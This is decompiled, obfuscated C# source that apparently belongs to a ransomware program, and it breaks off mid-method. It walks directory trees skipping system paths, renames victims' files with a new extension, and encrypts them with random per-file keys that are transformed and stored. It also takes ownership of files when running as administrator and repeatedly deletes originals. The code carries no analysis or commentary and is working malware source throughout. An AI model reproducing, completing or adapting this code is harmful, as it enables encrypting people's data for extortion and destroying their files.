using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CRPNLqUwoxImGM;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GfIOnzejDqtqB;

internal sealed class XpwFCiWTIXog
{
	public sealed class LESTRMZpbUJ
	{
		private static StringCollection oYIkqyyVmhJ;

		private static List<string> UfLHTdqiTPdDv;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107406550));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107406545)) && !text.ToLower().Contains(getString_0(107406524)) && !text.ToLower().Contains(getString_0(107391614)) && !text.ToLower().Contains(getString_0(107391601)) && !text.ToLower().Contains(getString_0(107406543)) && !text.ToLower().Contains(getString_0(107391965)) && !text.ToLower().Contains(getString_0(107391938)) && !text.ToLower().Contains(getString_0(107391889)) && !text.ToLower().Contains(getString_0(107391904)) && !text.ToLower().Contains(getString_0(107391887)) && !text.ToLower().Contains(getString_0(107391341)) && !text.ToLower().Contains(getString_0(107391292)) && !text.ToLower().Contains(getString_0(107391307)) && !text.ToLower().Contains(getString_0(107391262)) && !text.ToLower().Contains(getString_0(107391273)) && !text.ToLower().Contains(getString_0(107391228)) && !text.ToLower().Contains(getString_0(107391247)) && !text.ToLower().Contains(getString_0(107391198)) && !text.ToLower().Contains(getString_0(107391213)) && !text.Contains(pimTPtzgsj(getString_0(107391164))) && !text.Contains(getString_0(107391171)) && !text.Contains(getString_0(107391141)) && !text.EndsWith(getString_0(107395763)) && !text.EndsWith(getString_0(107391116)) && !text.EndsWith(getString_0(107391111)) && !text.EndsWith(getString_0(107391106)) && !text.EndsWith(getString_0(107391581)) && !text.ToLower().Contains(getString_0(107391576)) && !text.ToLower().Contains(mfDWFlrTLvSVI))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(xpRslkPIZNkPFMe) * 1024.0 * 1024.0 && LEpdgEkMnryDWG == getString_0(107396965))
							{
								UfLHTdqiTPdDv.Add(text);
							}
							else if (File.Exists(text) && LEpdgEkMnryDWG == getString_0(107396818))
							{
								UfLHTdqiTPdDv.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return UfLHTdqiTPdDv;
		}

		static LESTRMZpbUJ()
		{
			Strings.CreateGetStringDelegate(typeof(LESTRMZpbUJ));
			oYIkqyyVmhJ = new StringCollection();
			UfLHTdqiTPdDv = new List<string>();
		}
	}

	private sealed class aatYNrgncXKld
	{
		public string RwIrhVjqaPReR;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == RwIrhVjqaPReR;
		}
	}

	private sealed class CJBZszvuMqOnaFkS
	{
		private sealed class IVzCOecvgueo
		{
			public CJBZszvuMqOnaFkS PZKMTOPZbllI;

			public string hJaQiAAfMRr;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					chUckzDlGoQMejtE(WindowsIdentity.GetCurrent().Name, hJaQiAAfMRr);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				MIWQgnOOBvuMzF(hJaQiAAfMRr, PZKMTOPZbllI.wgNdKKNBgMmrF, PZKMTOPZbllI.LRPgecUAuDeAkFF, PZKMTOPZbllI.xAhwfrxQAIcLE, PZKMTOPZbllI.DdDgCApPxIgOo);
			}
		}

		public string[] wgNdKKNBgMmrF;

		public string[] xAhwfrxQAIcLE;

		public string DdDgCApPxIgOo;

		public string LRPgecUAuDeAkFF;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			IVzCOecvgueo CS_0024_003C_003E8__locals0 = new IVzCOecvgueo();
			CS_0024_003C_003E8__locals0.PZKMTOPZbllI = this;
			CS_0024_003C_003E8__locals0.hJaQiAAfMRr = string_0;
			if (YwGTeZrarTaZME && !oPrbscpupajC().Contains(getString_0(107389270)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						chUckzDlGoQMejtE(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.hJaQiAAfMRr);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wGSokduaWV == getString_0(107396971))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					MIWQgnOOBvuMzF(CS_0024_003C_003E8__locals0.hJaQiAAfMRr, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.wgNdKKNBgMmrF, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.LRPgecUAuDeAkFF, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.xAhwfrxQAIcLE, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.DdDgCApPxIgOo);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				MIWQgnOOBvuMzF(CS_0024_003C_003E8__locals0.hJaQiAAfMRr, wgNdKKNBgMmrF, LRPgecUAuDeAkFF, xAhwfrxQAIcLE, DdDgCApPxIgOo);
			}
		}

		static CJBZszvuMqOnaFkS()
		{
			Strings.CreateGetStringDelegate(typeof(CJBZszvuMqOnaFkS));
		}
	}

	private sealed class HLWpvTFsJHjPW
	{
		private sealed class YuUvQhRZkyoD
		{
			public HLWpvTFsJHjPW ukpRGssWFaai;

			public string dbOiPfZxCBNre;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in MYtmFoSEPowjeCH)
				{
					if (dbOiPfZxCBNre.ToLower().EndsWith(item + ukpRGssWFaai.DBqdIPWNdhJbe) && YcDZJAXfkcwFEP == getString_0(107396982))
					{
						if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > new FileInfo(dbOiPfZxCBNre).Length)
						{
							try
							{
								aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392318), getString_0(107392313), getString_0(107392268), dbOiPfZxCBNre);
							}
							catch
							{
							}
						}
					}
					else if (dbOiPfZxCBNre.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396835))
					{
						try
						{
							aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392318), getString_0(107392313), getString_0(107392268), dbOiPfZxCBNre);
						}
						catch
						{
						}
					}
				}
			}

			static YuUvQhRZkyoD()
			{
				Strings.CreateGetStringDelegate(typeof(YuUvQhRZkyoD));
			}
		}

		private sealed class ztbWhKTEeeLEH
		{
			public HLWpvTFsJHjPW ukpRGssWFaai;

			public string MaaFvhEKHjUj;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in MYtmFoSEPowjeCH)
				{
					if (MaaFvhEKHjUj.ToLower().EndsWith(item + ukpRGssWFaai.DBqdIPWNdhJbe) && YcDZJAXfkcwFEP == getString_0(107396985))
					{
						if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > new FileInfo(MaaFvhEKHjUj).Length)
						{
							try
							{
								aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392321), getString_0(107392316), getString_0(107392271), MaaFvhEKHjUj);
							}
							catch
							{
							}
						}
					}
					else if (MaaFvhEKHjUj.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396838))
					{
						try
						{
							aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392321), getString_0(107392316), getString_0(107392271), MaaFvhEKHjUj);
						}
						catch
						{
						}
					}
				}
			}

			static ztbWhKTEeeLEH()
			{
				Strings.CreateGetStringDelegate(typeof(ztbWhKTEeeLEH));
			}
		}

		public List<string> bhcWMgddYed;

		public List<string> DyzteUZXPQXh;

		public string DBqdIPWNdhJbe;

		public string[] DzcvmxGtzHbJp;

		public string sYegfhFfwOKgPE;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			YuUvQhRZkyoD CS_0024_003C_003E8__locals0;
			foreach (string item in DyzteUZXPQXh)
			{
				if (DzcvmxGtzHbJp.Length != 0)
				{
					string[] dzcvmxGtzHbJp = DzcvmxGtzHbJp;
					int num = 0;
					while (num < dzcvmxGtzHbJp.Length)
					{
						string value = dzcvmxGtzHbJp[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_07f8;
					}
				}
				try
				{
					if (item.EndsWith(DBqdIPWNdhJbe))
					{
						goto IL_07f8;
					}
				}
				catch (Exception)
				{
					goto IL_07f8;
				}
				if (!item.EndsWith(string_0) || PKEevhItGR.Contains(item))
				{
					continue;
				}
				if (EYxaInlnKpK == getString_0(107396979))
				{
					try
					{
						if (KPQDOzwtmVFOx.hsjTIvpOst(item))
						{
							KPQDOzwtmVFOx.lkWDWVGEltLMinY(item);
						}
					}
					catch
					{
					}
				}
				PKEevhItGR.Add(item);
				if (!xtzwHGpcURO.Contains(Path.GetDirectoryName(item)))
				{
					xtzwHGpcURO.Add(Path.GetDirectoryName(item));
				}
				OODPURvlNpeQk(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (AreaxgrYTj)
						{
							try
							{
								File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + item + getString_0(107406508) + ex2.Message + getString_0(107397174));
							}
							catch (Exception)
							{
							}
						}
						MtUrEdDRDzL++;
						goto end_IL_00ee;
					}
					if (EcxEPMzKnUKdFyvU == getString_0(107396979) && new FileInfo(item).Length > Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024 && !bhcWMgddYed.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new YuUvQhRZkyoD();
						CS_0024_003C_003E8__locals0.ukpRGssWFaai = this;
						try
						{
							if (DBqdIPWNdhJbe != getString_0(107389165))
							{
								if (XszgYccOIzBT)
								{
									DBqdIPWNdhJbe = HvklvwSSvrVzvZd + DBqdIPWNdhJbe;
								}
								File.Move(item, item + DBqdIPWNdhJbe);
							}
						}
						catch (Exception ex4)
						{
							if (AreaxgrYTj)
							{
								try
								{
									File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + item + getString_0(107406479) + ex4.Message + getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							MtUrEdDRDzL++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.dbOiPfZxCBNre = getString_0(107392202);
						if (DBqdIPWNdhJbe != getString_0(107389165))
						{
							CS_0024_003C_003E8__locals0.dbOiPfZxCBNre = item + DBqdIPWNdhJbe;
						}
						else
						{
							CS_0024_003C_003E8__locals0.dbOiPfZxCBNre = item;
						}
						if (dtpyECacgdgV == getString_0(107396979))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in MYtmFoSEPowjeCH)
								{
									if (CS_0024_003C_003E8__locals0.dbOiPfZxCBNre.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ukpRGssWFaai.DBqdIPWNdhJbe) && YcDZJAXfkcwFEP == YuUvQhRZkyoD.getString_0(107396982))
									{
										if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre).Length)
										{
											try
											{
												aOlPpFtnUBXreNv.oHaBhkBqIiP(YuUvQhRZkyoD.getString_0(107392318), YuUvQhRZkyoD.getString_0(107392313), YuUvQhRZkyoD.getString_0(107392268), CS_0024_003C_003E8__locals0.dbOiPfZxCBNre);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.dbOiPfZxCBNre.ToLower().EndsWith(item2) && YcDZJAXfkcwFEP == YuUvQhRZkyoD.getString_0(107396835))
									{
										try
										{
											aOlPpFtnUBXreNv.oHaBhkBqIiP(YuUvQhRZkyoD.getString_0(107392318), YuUvQhRZkyoD.getString_0(107392313), YuUvQhRZkyoD.getString_0(107392268), CS_0024_003C_003E8__locals0.dbOiPfZxCBNre);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
						string s = mIIgQsRoPFcf.lAQgyDpGyMnN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (rrRVvypnQbGQM == getString_0(107396832))
						{
							byte[] array = null;
							byte[] byte_ = YuMGwWVrDuXKA.rQKmlPLmPLw(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024);
							if (YuMGwWVrDuXKA.KGbVnsOVmaox(gGvXHaVXPnSt: (!jUTdQQEeFeYZhnmcv) ? (fpnZuwWWrCf ? YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fpnZuwWWrCf ? VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZXZtbOtOvaKKAi: CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, EHaoPciFCiUco: bytes))
							{
								goto IL_07f8;
							}
							try
							{
								File.Move(item + DBqdIPWNdhJbe, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!fpnZuwWWrCf)
						{
							if (HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, tKbCgjZzNwIevCY, sYegfhFfwOKgPE))
							{
								goto IL_07f8;
							}
							try
							{
								File.Move(item + DBqdIPWNdhJbe, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, tKbCgjZzNwIevCY, text, bytes))
							{
								goto IL_07f8;
							}
							try
							{
								File.Move(item + DBqdIPWNdhJbe, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (XszgYccOIzBT)
					{
						DBqdIPWNdhJbe = HvklvwSSvrVzvZd + DBqdIPWNdhJbe;
					}
					string text2 = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
					string s2 = mIIgQsRoPFcf.lAQgyDpGyMnN(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (DBqdIPWNdhJbe != getString_0(107389165))
					{
						if (!YBbHALckKieZ)
						{
							if (!fpnZuwWWrCf)
							{
								yHqsuJKABWzrvG(item, item + DBqdIPWNdhJbe, smKHsmzCQQJ);
							}
							else
							{
								yHqsuJKABWzrvG(item, item + DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!fpnZuwWWrCf)
								{
									zLBnoSiaCsn(item, item + DBqdIPWNdhJbe, smKHsmzCQQJ);
								}
								else
								{
									zLBnoSiaCsn(item, item + DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex9)
							{
								if (AreaxgrYTj)
								{
									try
									{
										File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + item + getString_0(107389151) + ex9.Message + getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								MtUrEdDRDzL++;
								try
								{
									File.Move(item + DBqdIPWNdhJbe, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_00ee;
							}
						}
					}
					else if (!YBbHALckKieZ)
					{
						if (!fpnZuwWWrCf)
						{
							yHqsuJKABWzrvG(item, item + getString_0(107389160), smKHsmzCQQJ);
						}
						else
						{
							yHqsuJKABWzrvG(item, item + getString_0(107389160), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!fpnZuwWWrCf)
							{
								zLBnoSiaCsn(item, item, smKHsmzCQQJ);
							}
							else
							{
								zLBnoSiaCsn(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex12)
						{
							if (AreaxgrYTj)
							{
								try
								{
									File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + item + getString_0(107389151) + ex12.Message + getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							MtUrEdDRDzL++;
							goto end_IL_00ee;
						}
					}
					if (fpnZuwWWrCf)
					{
						if (DBqdIPWNdhJbe != getString_0(107389165))
						{
							rEFsTTbNdvhUnSu(item + DBqdIPWNdhJbe, bytes2);
						}
						else
						{
							rEFsTTbNdvhUnSu(item, bytes2);
						}
					}
					goto IL_07f8;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_07f8;
				}
				continue;
				IL_07f8:
				DyzteUZXPQXh.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			ztbWhKTEeeLEH CS_0024_003C_003E8__locals0 = new ztbWhKTEeeLEH();
			CS_0024_003C_003E8__locals0.ukpRGssWFaai = this;
			CS_0024_003C_003E8__locals0.MaaFvhEKHjUj = string_0;
			if (DzcvmxGtzHbJp.Length != 0)
			{
				string[] dzcvmxGtzHbJp = DzcvmxGtzHbJp;
				int num = 0;
				while (num < dzcvmxGtzHbJp.Length)
				{
					string value = dzcvmxGtzHbJp[num];
					if (!CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_08b5;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.EndsWith(DBqdIPWNdhJbe))
				{
					goto IL_08b5;
				}
			}
			catch (Exception)
			{
				goto IL_08b5;
			}
			if (!PKEevhItGR.Contains(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj))
			{
				if (EYxaInlnKpK == getString_0(107396979))
				{
					try
					{
						if (KPQDOzwtmVFOx.hsjTIvpOst(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj))
						{
							KPQDOzwtmVFOx.lkWDWVGEltLMinY(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
						}
					}
					catch
					{
					}
				}
				PKEevhItGR.Add(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
				if (!xtzwHGpcURO.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj)))
				{
					xtzwHGpcURO.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj));
				}
				OODPURvlNpeQk(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (AreaxgrYTj)
						{
							try
							{
								File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + getString_0(107406508) + ex2.Message + getString_0(107397174));
							}
							catch (Exception)
							{
							}
						}
						MtUrEdDRDzL++;
						goto end_IL_0117_2;
					}
					if (EcxEPMzKnUKdFyvU == getString_0(107396979) && new FileInfo(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj).Length > Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024)
					{
						try
						{
							if (DBqdIPWNdhJbe != getString_0(107389165))
							{
								if (XszgYccOIzBT)
								{
									DBqdIPWNdhJbe = HvklvwSSvrVzvZd + DBqdIPWNdhJbe;
								}
								File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe);
							}
						}
						catch (Exception ex4)
						{
							if (AreaxgrYTj)
							{
								try
								{
									File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + getString_0(107406479) + ex4.Message + getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							MtUrEdDRDzL++;
							return;
						}
						if (DBqdIPWNdhJbe != getString_0(107389165))
						{
							CS_0024_003C_003E8__locals0.MaaFvhEKHjUj += DBqdIPWNdhJbe;
						}
						if (dtpyECacgdgV == getString_0(107396979))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in MYtmFoSEPowjeCH)
								{
									if (CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.ukpRGssWFaai.DBqdIPWNdhJbe) && YcDZJAXfkcwFEP == ztbWhKTEeeLEH.getString_0(107396985))
									{
										if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj).Length)
										{
											try
											{
												aOlPpFtnUBXreNv.oHaBhkBqIiP(ztbWhKTEeeLEH.getString_0(107392321), ztbWhKTEeeLEH.getString_0(107392316), ztbWhKTEeeLEH.getString_0(107392271), CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == ztbWhKTEeeLEH.getString_0(107396838))
									{
										try
										{
											aOlPpFtnUBXreNv.oHaBhkBqIiP(ztbWhKTEeeLEH.getString_0(107392321), ztbWhKTEeeLEH.getString_0(107392316), ztbWhKTEeeLEH.getString_0(107392271), CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
						string s = mIIgQsRoPFcf.lAQgyDpGyMnN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (rrRVvypnQbGQM == getString_0(107396832))
						{
							byte[] array = null;
							byte[] byte_ = YuMGwWVrDuXKA.rQKmlPLmPLw(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024);
							if (!YuMGwWVrDuXKA.KGbVnsOVmaox(gGvXHaVXPnSt: (!jUTdQQEeFeYZhnmcv) ? (fpnZuwWWrCf ? YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fpnZuwWWrCf ? VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZXZtbOtOvaKKAi: CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, EHaoPciFCiUco: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!fpnZuwWWrCf)
						{
							if (!HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, tKbCgjZzNwIevCY, sYegfhFfwOKgPE))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, tKbCgjZzNwIevCY, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (XszgYccOIzBT)
						{
							DBqdIPWNdhJbe = HvklvwSSvrVzvZd + DBqdIPWNdhJbe;
						}
						string text2 = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
						string s2 = mIIgQsRoPFcf.lAQgyDpGyMnN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (DBqdIPWNdhJbe != getString_0(107389165))
						{
							if (!YBbHALckKieZ)
							{
								if (!fpnZuwWWrCf)
								{
									yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, smKHsmzCQQJ);
								}
								else
								{
									yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!fpnZuwWWrCf)
									{
										zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, smKHsmzCQQJ);
									}
									else
									{
										zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (AreaxgrYTj)
									{
										try
										{
											File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + getString_0(107389151) + ex9.Message + getString_0(107397174));
										}
										catch (Exception)
										{
										}
									}
									MtUrEdDRDzL++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!YBbHALckKieZ)
						{
							if (!fpnZuwWWrCf)
							{
								yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + getString_0(107389160), smKHsmzCQQJ);
							}
							else
							{
								yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + getString_0(107389160), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!fpnZuwWWrCf)
								{
									zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, smKHsmzCQQJ);
								}
								else
								{
									zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (AreaxgrYTj)
								{
									try
									{
										File.AppendAllText(RqqYTsMuxEQen, getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + getString_0(107389151) + ex12.Message + getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								MtUrEdDRDzL++;
								return;
							}
						}
						if (fpnZuwWWrCf)
						{
							if (DBqdIPWNdhJbe != getString_0(107389165))
							{
								rEFsTTbNdvhUnSu(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + DBqdIPWNdhJbe, bytes2);
							}
							else
							{
								rEFsTTbNdvhUnSu(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_08b5;
			IL_08b5:
			DyzteUZXPQXh.Remove(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
		}

		static HLWpvTFsJHjPW()
		{
			Strings.CreateGetStringDelegate(typeof(HLWpvTFsJHjPW));
		}
	}

	private sealed class vCYDHRWOhOXp
	{
		public string aWoiCVCXftar;

		public string gDpoNjhTmVraF;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(aWoiCVCXftar);
					break;
				}
				catch
				{
